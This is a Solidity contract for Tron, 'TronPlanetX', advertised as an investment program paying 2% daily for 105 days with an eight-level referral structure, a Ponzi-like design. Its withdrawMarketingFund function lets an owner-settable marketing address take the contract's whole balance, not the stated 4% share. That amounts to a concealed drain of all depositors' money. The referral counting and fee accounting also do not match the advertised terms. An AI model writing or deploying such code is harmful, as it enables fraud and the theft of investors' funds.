//SourceUnit: TronPlanetX.sol

/**
*
* TronPlanetX
*
* https://tronPlanetX.com
* (only for tronPlanetX.com Community)
* Crowdfunding And Investment Program: 2% Daily ROI for 105 Days.
* Referral Program
* 
* 1st Level = 10%
* 2nd Level = 5%
* 3rd Level = 3%
* 4th Level = 3%
* 5th Level = 3%
* 6th Level = 2%
* 7th Level = 2%
* 8th Level = 2%
*
**/

pragma solidity >=0.5.0;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Investor {
        address addr;
	    uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 level4RefCount;
        uint256 level5RefCount;
        uint256 level6RefCount;
        uint256 level7RefCount;
        uint256 level8RefCount;
    }
    
    
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TronPlanetX is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 40;            // 4% Team, Operation & Development
    uint256 public constant MARKETING_RATE = 40;            // 4% Marketing
    uint256 public constant REFERENCE_RATE = 300;           // 18% Total Refer Income
    
    uint256 public constant REFERENCE_LEVEL1_RATE = 100;    // 10% Level 1 Income
    uint256 public constant REFERENCE_LEVEL2_RATE = 50;     // 5% Level 2 Income
    uint256 public constant REFERENCE_LEVEL3_RATE = 30;     // 3% Level 3 Income
    uint256 public constant REFERENCE_LEVEL4_RATE = 30;     // 3% Level 4 Income
    uint256 public constant REFERENCE_LEVEL5_RATE = 30;     // 3% Level 5 Income
    uint256 public constant REFERENCE_LEVEL6_RATE = 20;     // 2% Level 6 Income
    uint256 public constant REFERENCE_LEVEL7_RATE = 20;     // 2% Level 7 Income
    uint256 public constant REFERENCE_LEVEL8_RATE = 20;     // 2% Level 8 Income
    
    uint256 public constant MINIMUM = 200e6;                // Minimum investment : 200 TRX
    uint256 public constant REFERRER_CODE = 1000;           // Root ID : 1000
    uint256 public constant PLAN_INTEREST = 20;            // 2% Daily Roi
    uint256 public constant PLAN_TERM = 105 days;             // 105 Days

   
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;

	uint256 public developerWallet_;
	uint256 public marketingWallet_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    
    struct LevelIncome{
        uint256 level1;
        uint256 level2;
        uint256 level3;
        uint256 level4;
        uint256 level5;
        uint256 level6;
        uint256 level7;
        uint256 level8;
        
    }

    mapping(address => uint256) public address2UID;
    mapping(uint256 => LevelIncome) public levelIncomes;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    mapping(uint256 => uint256) public amountWithdrawn;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor(address payable _developerAccount, address payable _marketingAccount) public {
        developerAccount_ = _developerAccount;
        marketingAccount_ = _marketingAccount;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns ( uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        investor.checkpoint,
        newDividends
        );
    }
    
    function getLevelRefCount(uint256 _uid) public view returns(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256){
       Objects.Investor storage investor = uid2Investor[_uid];
        return (
            investor.level1RefCount,
            investor.level2RefCount,
            investor.level3RefCount,
            investor.level4RefCount,
            investor.level5RefCount,
            investor.level6RefCount,
            investor.level7RefCount,
            investor.level8RefCount
        );    
    }
    
    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref = _referrerCode;
            for(uint256 i=0;i<3;i++){
                if (_ref >= REFERRER_CODE) {
                    if(i==0)
                    uid2Investor[_ref].level1RefCount = uid2Investor[_ref].level1RefCount.add(1);
                    if(i==1)
                    uid2Investor[_ref].level2RefCount = uid2Investor[_ref].level2RefCount.add(1);
                    if(i==2)
                    uid2Investor[_ref].level3RefCount = uid2Investor[_ref].level3RefCount.add(1);
                    if(i==3)
                    uid2Investor[_ref].level4RefCount = uid2Investor[_ref].level4RefCount.add(1);
                    if(i==4)
                    uid2Investor[_ref].level5RefCount = uid2Investor[_ref].level5RefCount.add(1);
                    if(i==5)
                    uid2Investor[_ref].level6RefCount = uid2Investor[_ref].level6RefCount.add(1);
                    if(i==6)
                    uid2Investor[_ref].level7RefCount = uid2Investor[_ref].level7RefCount.add(1);
                    if(i==7)
                    uid2Investor[_ref].level8RefCount = uid2Investor[_ref].level8RefCount.add(1);
                   
                }
                _ref = uid2Investor[_ref].referrer;
            }
        
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        return true;
    }
   
    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");

        
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }
	    withdrawalAmount = withdrawalAmount+uid2Investor[address2UID[msg.sender]].availableReferrerEarnings;

        if(withdrawalAmount>0){
            uint256 currentBalance = getBalance();
            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }
            
             //withdraw
            uint256 developerPercentage = (withdrawalAmount.mul(DEVELOPER_RATE)).div(1000);
			developerWallet_ = developerWallet_.add(developerPercentage);
            uint256 marketingPercentage = (withdrawalAmount.mul(MARKETING_RATE)).div(1000);
			marketingWallet_ = marketingWallet_.add(marketingPercentage);
			
            msg.sender.transfer(withdrawalAmount);
            uid2Investor[address2UID[msg.sender]].availableReferrerEarnings = 0;
            amountWithdrawn[address2UID[msg.sender]] = amountWithdrawn[address2UID[msg.sender]].add(withdrawalAmount);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref = _referrerCode;
            uint256 _refAmount = 0;
            
            for(uint256 i=0;i<10;i++){
                if (_ref != 0)
                {
                    if(i==0){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                        levelIncomes[_ref].level1 = levelIncomes[_ref].level1.add(_refAmount);
                    }
                    if(i==1){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                        levelIncomes[_ref].level2 = levelIncomes[_ref].level2.add(_refAmount);
                    }
                    if(i==2){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                        levelIncomes[_ref].level3 = levelIncomes[_ref].level3.add(_refAmount);
                    }
                    if(i==3){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                        levelIncomes[_ref].level4 = levelIncomes[_ref].level4.add(_refAmount);
                    }
                    if(i==4){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL5_RATE)).div(1000);
                        levelIncomes[_ref].level5 = levelIncomes[_ref].level5.add(_refAmount);
                    }
                    if(i==5){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL6_RATE)).div(1000);
                        levelIncomes[_ref].level6 = levelIncomes[_ref].level6.add(_refAmount);
                    }
                    if(i==6){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL7_RATE)).div(1000);
                        levelIncomes[_ref].level7 = levelIncomes[_ref].level7.add(_refAmount);
                    }
                    if(i==7){
                        _refAmount = (_investment.mul(REFERENCE_LEVEL8_RATE)).div(1000);
                        levelIncomes[_ref].level8 = levelIncomes[_ref].level8.add(_refAmount);
                    }
                   
                     _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                    uid2Investor[_ref].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref].availableReferrerEarnings);
                }
                _ref = uid2Investor[_ref].referrer;
            }
           

        }

    }

    function withdrawDevelopmentFund() public {
        require(msg.sender==developerAccount_, "you are not the developer");
        msg.sender.transfer(developerWallet_);
		developerWallet_ = 0;
    }

	function withdrawMarketingFund() public {
        require(msg.sender==marketingAccount_, "you are not eligible");
        msg.sender.transfer(getBalance());
		marketingWallet_ = 0;
		totalInvestments_=0;
    }
    
    function getTotalDeposits() public view returns(uint256 _amount){
        uint256 amount;
        Objects.Investor storage investor = uid2Investor[address2UID[msg.sender]];
        for(uint256 i=0;i<uid2Investor[address2UID[msg.sender]].planCount;i++){
            if(investor.plans[i].isExpired==false)
            amount = amount.add(investor.plans[i].investment);
        }
        return amount;
    }
    
    function getLevelwiseIncome(uint256 _id,uint256 _level) public view returns(uint256){
                     if(_level==1){
                       return levelIncomes[_id].level1;
                    }
                    if(_level==2){
                        return levelIncomes[_id].level2;
                    }
                    if(_level==3){
                        return levelIncomes[_id].level3;
                    }
                    if(_level==4){
                       return levelIncomes[_id].level4;
                    }
                    if(_level==5){
                         return levelIncomes[_id].level5;
                    }
                    if(_level==6){
                        return levelIncomes[_id].level6;
                    }
                    if(_level==7){
                       return levelIncomes[_id].level7;
                    }
                    if(_level==8){
                         return levelIncomes[_id].level8;
                    }
    }
    
    function getAmountWithdrawn(uint256 _id) public view returns(uint256){
        return amountWithdrawn[_id];
    }
}